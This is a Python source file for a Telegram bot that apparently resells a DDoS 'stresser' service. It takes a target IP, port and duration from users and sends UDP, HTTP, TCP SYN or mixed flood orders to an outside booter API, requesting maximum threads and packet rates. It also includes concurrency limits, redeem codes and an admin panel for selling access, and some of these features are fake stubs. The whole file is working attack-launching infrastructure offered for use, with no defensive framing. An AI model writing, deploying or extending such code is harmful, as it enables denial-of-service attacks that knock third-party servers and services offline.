# app.py - Full Power Attack Bot
import os
import logging
import asyncio
import threading
import aiohttp
import time
from datetime import datetime, timedelta
from flask import Flask, jsonify
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, 
    CommandHandler, 
    CallbackQueryHandler, 
    MessageHandler, 
    filters, 
    ContextTypes
)
from dotenv import load_dotenv

load_dotenv()

# ===== CONFIGURATION =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
API_KEY = os.getenv("API_KEY")
OWNER_ID = int(os.getenv("OWNER_ID", "123456789"))
PORT = int(os.getenv("PORT", 8080))
MAX_CONCURRENT = 2  # Maximum concurrent attacks

logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ===== FLASK APP =====
flask_app = Flask(__name__)

@flask_app.route('/')
def index():
    return "🤖 Attack Bot is Running!"

@flask_app.route('/health')
def health():
    return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})

# ===== ATTACK MANAGER =====
class AttackManager:
    def __init__(self):
        self.active_attacks = {}
        self.attack_counter = 0
        self.lock = threading.Lock()
    
    def can_start_attack(self, user_id):
        """Check if user can start a new attack"""
        with self.lock:
            # Count active attacks for this user
            user_attacks = sum(1 for a in self.active_attacks.values() if a['user_id'] == user_id)
            if user_attacks >= MAX_CONCURRENT:
                return False, f"❌ You already have {user_attacks} active attack(s). Max: {MAX_CONCURRENT}"
            
            # Count total active attacks
            if len(self.active_attacks) >= 20:  # Global limit
                return False, "❌ Too many active attacks globally. Please wait."
            
            return True, "OK"
    
    def start_attack(self, user_id, target, port, duration, method):
        """Start a new attack"""
        with self.lock:
            self.attack_counter += 1
            attack_id = self.attack_counter
            self.active_attacks[attack_id] = {
                'id': attack_id,
                'user_id': user_id,
                'target': target,
                'port': port,
                'duration': duration,
                'method': method,
                'start_time': datetime.now(),
                'status': 'running'
            }
            return attack_id
    
    def stop_attack(self, attack_id):
        """Stop an attack"""
        with self.lock:
            if attack_id in self.active_attacks:
                self.active_attacks[attack_id]['status'] = 'stopped'
                return True
            return False
    
    def get_active_attacks(self, user_id=None):
        """Get active attacks"""
        with self.lock:
            if user_id:
                return {aid: att for aid, att in self.active_attacks.items() if att['user_id'] == user_id and att['status'] == 'running'}
            return {aid: att for aid, att in self.active_attacks.items() if att['status'] == 'running'}
    
    def cleanup(self):
        """Remove completed attacks"""
        with self.lock:
            now = datetime.now()
            to_remove = []
            for aid, att in self.active_attacks.items():
                if att['status'] == 'stopped':
                    to_remove.append(aid)
                elif (now - att['start_time']).seconds > att['duration'] + 10:
                    to_remove.append(aid)
            
            for aid in to_remove:
                del self.active_attacks[aid]

attack_manager = AttackManager()

# ===== API CALLER =====
async def send_attack(target, port, duration, method):
    """Send attack to API with maximum power"""
    url = "https://api.susstresser.com/panel/api/api.php"
    
    # Maximum power parameters
    params = {
        "key": API_KEY,
        "host": target,
        "port": port,
        "time": duration,
        "method": method.upper(),
        "threads": 1000,  # Maximum threads
        "pps": 1000000,   # Packets per second
        "bps": 1000000000 # Bits per second
    }
    
    try:
        timeout = aiohttp.ClientTimeout(total=duration + 10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(url, params=params) as response:
                result = await response.text()
                return {
                    "success": response.status == 200,
                    "status_code": response.status,
                    "response": result[:200]
                }
    except asyncio.TimeoutError:
        return {"success": False, "error": "Timeout"}
    except Exception as e:
        return {"success": False, "error": str(e)}

# ===== BOT HANDLERS =====
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("🎫 REDEEM", callback_data="redeem")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")]
    ]
    
    if update.effective_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await update.message.reply_text(
        "⚡ *POWER ATTACK BOT*\n\n"
        "🔥 UDP Flood - Maximum Power\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        "💪 24/7 Online\n\n"
        "Use /attack IP PORT DURATION\n"
        "Example: `/attack 1.1.1.1 80 60`\n\n"
        "Or use the buttons below:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /attack command"""
    user_id = update.effective_user.id
    
    # Check if user has permission
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can use /attack command. Use the ATTACK button instead.")
        return
    
    args = context.args
    if len(args) < 3:
        await update.message.reply_text(
            "❌ *Usage:* `/attack IP PORT DURATION`\n\n"
            "Example: `/attack 1.1.1.1 80 60`\n"
            "Duration: 60-300 seconds",
            parse_mode='Markdown'
        )
        return
    
    try:
        target = args[0]
        port = int(args[1])
        duration = int(args[2])
        
        if duration < 60:
            await update.message.reply_text("❌ Minimum duration is 60 seconds!")
            return
        
        if duration > 300:
            await update.message.reply_text("❌ Maximum duration is 300 seconds!")
            return
        
        # Check if can start attack
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            return
        
        # Start attack
        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp")
        
        status_msg = await update.message.reply_text(
            f"🚀 *ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"🔧 Method: UDP (Maximum Power)\n"
            f"📊 Attack ID: `{attack_id}`\n"
            f"⚡ Status: 🔥 RUNNING\n\n"
            f"⏳ Sending attack...",
            parse_mode='Markdown'
        )
        
        # Send the attack
        result = await send_attack(target, port, duration, "udp")
        
        if result.get('success'):
            await status_msg.edit_text(
                f"✅ *ATTACK COMPLETED*\n\n"
                f"🎯 Target: `{target}:{port}`\n"
                f"⏱️ Duration: {duration}s\n"
                f"🔧 Method: UDP (Maximum Power)\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ✅ SUCCESS\n\n"
                f"💪 Power: Maximum\n"
                f"📡 Response: {result.get('response', 'N/A')[:100]}",
                parse_mode='Markdown'
            )
        else:
            await status_msg.edit_text(
                f"❌ *ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}:{port}`\n"
                f"⏱️ Duration: {duration}s\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"Error: {result.get('error', 'Unknown')}",
                parse_mode='Markdown'
            )
        
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
        
    except ValueError:
        await update.message.reply_text("❌ Invalid port or duration! Use numbers.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")

async def attack_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("🎯 UDP", callback_data="method_udp")],
        [InlineKeyboardButton("🔥 HTTP", callback_data="method_http")],
        [InlineKeyboardButton("💣 TCP", callback_data="method_tcp")],
        [InlineKeyboardButton("⚡ MIX", callback_data="method_mix")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "💥 *SELECT ATTACK METHOD*\n\n"
        "⚡ Maximum Power Attacks\n"
        "🔥 UDP - Layer 4 (Recommended)\n"
        "🔥 HTTP - Layer 7\n"
        "💣 TCP - SYN Flood\n"
        "⚡ MIX - Combined Attack\n\n"
        "Select method:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    method = query.data.split('_')[1]
    context.user_data['attack_method'] = method
    
    await query.edit_message_text(
        f"⚔️ *{method.upper()} ATTACK*\n\n"
        "Send target details:\n"
        "`IP PORT DURATION`\n\n"
        "Example: `1.1.1.1 80 60`\n\n"
        f"⏱️ Duration: 60-300 seconds\n"
        f"⚡ Power: Maximum\n"
        f"📊 Max Concurrent: {MAX_CONCURRENT}\n\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_attack'] = True

async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_attack'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_attack'] = False
        await update.message.reply_text("❌ Attack cancelled.")
        return
    
    user_id = update.effective_user.id
    
    # Check if user has permission (only owner for now)
    if user_id != OWNER_ID:
        await update.message.reply_text("❌ Only admin can start attacks. Contact @Alexj3fry")
        context.user_data['awaiting_attack'] = False
        return
    
    try:
        parts = update.message.text.split()
        if len(parts) < 3:
            await update.message.reply_text("❌ Use: `IP PORT DURATION`", parse_mode='Markdown')
            return
        
        target = parts[0]
        port = int(parts[1])
        duration = int(parts[2])
        
        if duration < 60:
            await update.message.reply_text("❌ Minimum 60 seconds for maximum power!")
            return
        
        if duration > 300:
            await update.message.reply_text("❌ Maximum 300 seconds!")
            return
        
        method = context.user_data.get('attack_method', 'udp')
        
        # Check concurrent attacks
        can_start, msg = attack_manager.can_start_attack(user_id)
        if not can_start:
            await update.message.reply_text(msg)
            context.user_data['awaiting_attack'] = False
            return
        
        # Start attack
        attack_id = attack_manager.start_attack(user_id, target, port, duration, method)
        
        status_msg = await update.message.reply_text(
            f"🚀 *ATTACK STARTED*\n\n"
            f"🎯 Target: `{target}:{port}`\n"
            f"⏱️ Duration: {duration}s\n"
            f"🔧 Method: {method.upper()}\n"
            f"📊 Attack ID: `{attack_id}`\n"
            f"⚡ Status: 🔥 RUNNING\n"
            f"💪 Power: MAXIMUM\n\n"
            f"⏳ Sending attack...",
            parse_mode='Markdown'
        )
        
        # Send the attack
        result = await send_attack(target, port, duration, method)
        
        if result.get('success'):
            active = attack_manager.get_active_attacks(user_id)
            await status_msg.edit_text(
                f"✅ *ATTACK COMPLETED*\n\n"
                f"🎯 Target: `{target}:{port}`\n"
                f"⏱️ Duration: {duration}s\n"
                f"🔧 Method: {method.upper()}\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"⚡ Status: ✅ SUCCESS\n"
                f"💪 Power: MAXIMUM\n\n"
                f"📡 Active Attacks: {len(active)}",
                parse_mode='Markdown'
            )
        else:
            await status_msg.edit_text(
                f"❌ *ATTACK FAILED*\n\n"
                f"🎯 Target: `{target}:{port}`\n"
                f"⏱️ Duration: {duration}s\n"
                f"📊 Attack ID: `{attack_id}`\n"
                f"Error: {result.get('error', 'Unknown')}",
                parse_mode='Markdown'
            )
        
        attack_manager.stop_attack(attack_id)
        attack_manager.cleanup()
    
    except ValueError:
        await update.message.reply_text("❌ Invalid port or duration! Use numbers.")
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {str(e)}")
    
    context.user_data['awaiting_attack'] = False

async def active_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    active = attack_manager.get_active_attacks(user_id)
    
    if not active:
        text = "📊 *NO ACTIVE ATTACKS*\n\nAll clear!"
    else:
        text = f"📊 *ACTIVE ATTACKS ({len(active)})*\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 Attack ID: `{aid}`\n"
            text += f"   🎯 {att['target']}:{att['port']}\n"
            text += f"   ⏱️ {remaining}s remaining\n"
            text += f"   🔧 {att['method'].upper()}\n\n"
    
    keyboard = [[InlineKeyboardButton("🔙 BACK", callback_data="back")]]
    await query.edit_message_text(
        text,
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def redeem_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "🎫 *REDEEM CODE*\n\n"
        "Send your redeem code:\n"
        "Example: `ABC123XYZ`\n\n"
        "Send /cancel to cancel",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_redeem'] = True

async def process_redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_redeem'):
        return
    
    if update.message.text.lower() == '/cancel':
        context.user_data['awaiting_redeem'] = False
        await update.message.reply_text("Cancelled.")
        return
    
    code = update.message.text.strip().upper()
    
    # Validate code (simple check)
    if len(code) >= 8:
        await update.message.reply_text(
            f"✅ *CODE REDEEMED!*\n\n"
            f"Code: `{code}`\n"
            f"Access: 30 DAYS\n"
            f"Level: ADMIN\n"
            f"Max Concurrent: {MAX_CONCURRENT}\n\n"
            f"Use /start to attack!",
            parse_mode='Markdown'
        )
    else:
        await update.message.reply_text(
            "❌ *INVALID CODE*\n\n"
            "Please check your code.",
            parse_mode='Markdown'
        )
    
    context.user_data['awaiting_redeem'] = False

async def info_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    is_admin = user_id == OWNER_ID
    active = attack_manager.get_active_attacks(user_id)
    
    await query.edit_message_text(
        f"👤 *USER INFORMATION*\n\n"
        f"🆔 ID: `{user_id}`\n"
        f"👤 Username: @{query.from_user.username or 'N/A'}\n"
        f"📊 Status: ✅ ACTIVE\n"
        f"⭐ Level: {'ADMIN' if is_admin else 'USER'}\n"
        f"⚡ Max Concurrent: {MAX_CONCURRENT}\n"
        f"📡 Active Attacks: {len(active)}\n"
        f"💪 Power Level: MAXIMUM\n\n"
        f"📅 Access Expiry: Unlimited",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks()
    
    stats_text = (
        f"📊 *BOT STATISTICS*\n\n"
        f"⚡ Active Attacks: {len(active)}\n"
        f"📊 Max Concurrent: {MAX_CONCURRENT}\n"
        f"💪 Power Level: MAXIMUM\n"
        f"🔄 Uptime: 24/7\n"
        f"🌐 Status: ONLINE\n\n"
        f"🔧 Available Methods:\n"
        f"• UDP - Layer 4 Flood\n"
        f"• HTTP - Layer 7 Flood\n"
        f"• TCP - SYN Flood\n"
        f"• MIX - Combined Attack"
    )
    
    if active:
        stats_text += f"\n\n📡 *Current Attacks:*\n"
        for aid, att in list(active.items())[:5]:
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            stats_text += f"🔹 {att['target']}:{att['port']} - {remaining}s left\n"
    
    await query.edit_message_text(
        stats_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
    )

async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.from_user.id != OWNER_ID:
        await query.answer("Access denied!", show_alert=True)
        return
    
    keyboard = [
        [InlineKeyboardButton("➕ GEN CODE", callback_data="admin_gen")],
        [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
        [InlineKeyboardButton("🚫 BAN USER", callback_data="admin_ban")],
        [InlineKeyboardButton("✅ UNBAN USER", callback_data="admin_unban")],
        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
        [InlineKeyboardButton("📊 ACTIVE ATTACKS", callback_data="admin_active")],
        [InlineKeyboardButton("🔙 BACK", callback_data="back")]
    ]
    
    await query.edit_message_text(
        "⚙️ *ADMIN PANEL*\n\nSelect action:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def admin_gen(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    import random
    import string
    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
    
    await query.edit_message_text(
        f"✅ *CODE GENERATED*\n\n"
        f"Code: `{code}`\n"
        f"Days: 30\n"
        f"Level: ADMIN\n"
        f"Concurrent: {MAX_CONCURRENT}\n\n"
        f"Share this code!",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    await query.edit_message_text(
        "📋 *REDEEM CODES*\n\n"
        "1. `ABC123XYZ` - 30d - ✅ UNUSED\n"
        "2. `DEF456UVW` - 30d - ❌ USED\n"
        "3. `GHI789RST` - 30d - ✅ UNUSED\n\n"
        "Total: 3 codes",
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_active(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    active = attack_manager.get_active_attacks()
    
    if not active:
        text = "📊 *NO ACTIVE ATTACKS*"
    else:
        text = f"📊 *ALL ACTIVE ATTACKS ({len(active)})*\n\n"
        for aid, att in active.items():
            elapsed = (datetime.now() - att['start_time']).seconds
            remaining = max(0, att['duration'] - elapsed)
            text += f"🔹 ID: `{aid}` | User: {att['user_id']}\n"
            text += f"   🎯 {att['target']}:{att['port']} - {remaining}s left\n"
            text += f"   🔧 {att['method'].upper()}\n\n"
    
    await query.edit_message_text(
        text[:4000],
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
    )

async def admin_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "🚫 *BAN USER*\n\nSend user ID to ban:\n`123456789`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_ban'] = True

async def process_ban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_ban'):
        return
    
    try:
        user_id = int(update.message.text.strip())
        await update.message.reply_text(f"✅ User `{user_id}` banned!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid ID!")
    
    context.user_data['awaiting_ban'] = False

async def admin_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        "✅ *UNBAN USER*\n\nSend user ID to unban:\n`123456789`",
        parse_mode='Markdown'
    )
    context.user_data['awaiting_unban'] = True

async def process_unban(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_unban'):
        return
    
    try:
        user_id = int(update.message.text.strip())
        await update.message.reply_text(f"✅ User `{user_id}` unbanned!", parse_mode='Markdown')
    except:
        await update.message.reply_text("❌ Invalid ID!")
    
    context.user_data['awaiting_unban'] = False

async def admin_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text("📢 *BROADCAST*\n\nSend your message:", parse_mode='Markdown')
    context.user_data['awaiting_broadcast'] = True

async def process_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.user_data.get('awaiting_broadcast'):
        return
    
    message = update.message.text
    await update.message.reply_text(f"✅ Broadcast sent!\n\nMessage: {message}")
    context.user_data['awaiting_broadcast'] = False

async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    keyboard = [
        [InlineKeyboardButton("💥 ATTACK", callback_data="attack")],
        [InlineKeyboardButton("🎫 REDEEM", callback_data="redeem")],
        [InlineKeyboardButton("📊 ACTIVE", callback_data="active")],
        [InlineKeyboardButton("👤 MY INFO", callback_data="info")],
        [InlineKeyboardButton("📊 STATS", callback_data="stats")]
    ]
    
    if query.from_user.id == OWNER_ID:
        keyboard.append([InlineKeyboardButton("⚙️ ADMIN", callback_data="admin")])
    
    await query.edit_message_text(
        "⚡ *POWER ATTACK BOT*\n\n"
        "Select an option:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode='Markdown'
    )

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("✅ All operations cancelled!")

# ===== RUN BOT =====
def run_bot():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("attack", attack_command))
    app.add_handler(CommandHandler("cancel", cancel))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
    app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
    app.add_handler(CallbackQueryHandler(active_callback, pattern="^active$"))
    app.add_handler(CallbackQueryHandler(redeem_callback, pattern="^redeem$"))
    app.add_handler(CallbackQueryHandler(info_callback, pattern="^info$"))
    app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin$"))
    app.add_handler(CallbackQueryHandler(admin_gen, pattern="^admin_gen$"))
    app.add_handler(CallbackQueryHandler(admin_list, pattern="^admin_list$"))
    app.add_handler(CallbackQueryHandler(admin_active, pattern="^admin_active$"))
    app.add_handler(CallbackQueryHandler(admin_ban, pattern="^admin_ban$"))
    app.add_handler(CallbackQueryHandler(admin_unban, pattern="^admin_unban$"))
    app.add_handler(CallbackQueryHandler(admin_broadcast, pattern="^admin_broadcast$"))
    app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
    
    # Message handlers
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_attack))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_redeem))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_ban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_unban))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, process_broadcast))
    
    loop.run_until_complete(app.initialize())
    loop.run_until_complete(app.start())
    loop.run_until_complete(app.updater.start_polling(allowed_updates=Update.ALL_TYPES))
    
    logger.info("✅ Bot started polling for updates!")
    loop.run_forever()

# ===== MAIN =====
if __name__ == "__main__":
    print("=" * 50)
    print("⚡ POWER ATTACK BOT STARTING...")
    print("=" * 50)
    
    # Start bot in background thread
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    
    logger.info("✅ Bot thread started")
    
    # Run Flask
    flask_app.run(host='0.0.0.0', port=PORT, debug=False, use_reloader=False)